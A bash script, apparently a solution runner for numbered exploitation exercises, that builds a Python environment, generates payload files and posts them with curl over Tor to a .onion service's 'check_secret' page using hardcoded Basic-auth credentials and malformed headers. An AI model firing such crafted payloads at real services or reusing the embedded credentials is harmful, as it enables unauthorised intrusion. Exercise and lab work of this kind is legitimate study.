#!/bin/bash


cd four/

rm -rf venv/

echo -n 'Creating python virtual environment...'
python3 -mvenv venv

source venv/bin/activate

pip install -r requirements.txt

cd ..

cd five/


python3 five-target.py

# give max time 8 seconds so that curl stops expected for data
cat payload.bin | curl --trace - \
	-X POST \
	--socks5-hostname localhost:9050 \
	--data-binary  @- \
	-H 'Connection: keep-alive' \
	-H 'Content-Length: 0' \
	-H 'Authorization: Basic YWRtaW46aGFtbWVydGltZQ==' \
	--http0.9 \
	--max-time 8 \
	xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html



cd ..


cd six/

python3 six-target.py

cat payload.bin | curl --trace - \
	-X POST \
	--socks5-hostname localhost:9050 \
	--data-binary  @- \
	-H 'Connection: keep-alive' \
	-H 'Content-Length: 0' \
	-H 'Authorization: Basic YWRtaW46aGFtbWVydGltZQ==' \
	--http0.9 \
	--max-time 8 \
	xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html

cd ..